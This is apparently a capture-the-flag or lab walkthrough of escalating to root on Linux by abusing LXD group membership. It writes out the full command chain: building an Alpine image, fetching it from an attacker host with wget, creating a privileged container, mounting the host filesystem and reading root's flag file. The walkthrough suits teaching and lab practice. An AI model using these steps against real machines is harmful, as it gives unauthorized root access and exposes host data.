Privilege escalation through lxd requires the access of local account, therefore, we choose SSH to connect and take the access local account on host machine.

_Note: the most important condition is that the user should be a member of lxd group._

ssh raj@192.168.1.105

![](https://i0.wp.com/1.bp.blogspot.com/-jyRKVNcGy3E/XaHYLb3nFXI/AAAAAAAAg6A/JfkG7FazSLYvQDZPepJw35U9l0T5SfGwQCLcBGAsYHQ/s1600/8.png?w=640&ssl=1)

In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

1.  **Steps to be performed on the attacker machine**:

-   Download build-alpine in your local machine through the git repository.
-   Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
-   Transfer the tar file to the host machine

2.  **Steps to be performed on the host machine:**

-   Download the alpine image
-   Import image for lxd
-   Initialize the image inside a new container.
-   Mount the container inside the /root directory

So, we downloaded the build alpine using the GitHub repose.

```
git clone  https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

./build-alpine
```

![](https://i0.wp.com/1.bp.blogspot.com/-Pq2pI1v8leE/XaHYL9-edOI/AAAAAAAAg6E/T9bKB2fY8dUYd8eJFVLpv3-UPMxcmcRVACLcBGAsYHQ/s1600/9.png?w=640&ssl=1)

On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.

python -m SimpleHTTPServer

![](https://i0.wp.com/1.bp.blogspot.com/-QJY3OdT2k8w/XaHYISYrQ-I/AAAAAAAAg5c/oYFVSoQB_w0DbfvddZirjoirtsUm112_QCLcBGAsYHQ/s1600/10.png?w=640&ssl=1)

On another hand we will download the alpine-image inside /tmp directory on the host machine.

```
cd /tmp

wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz

```

After the image is built it can be added as an image to LXD as follows:

```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

use the list command to check the list of images

lxc image list

![](https://i0.wp.com/1.bp.blogspot.com/-yy1afthCNsc/XaHYJSIM37I/AAAAAAAAg5g/KTDuZuVIjmMzqEzlMsNY0E59r7UDV28tACLcBGAsYHQ/s1600/11.png?w=640&ssl=1)

```
lxc init myimage ignite -c security.privileged=true
```

```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

```
lxc start ignite
```

```
lxc exec ignite /bin/sh
```

```
id
```

Once inside the container, navigate to /mnt/root to see all resources from the host machine.

After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the flag and found it.

mnt/root/root
ls
flag.txt
cat flag.txt

![](https://i0.wp.com/1.bp.blogspot.com/-Anb2MgTn7oM/XaHYJib3nnI/AAAAAAAAg5k/vazX4tfy3OEJLQ8EZ-o-1LEWvOpD4_vHwCLcBGAsYHQ/s1600/12.png?w=640&ssl=1)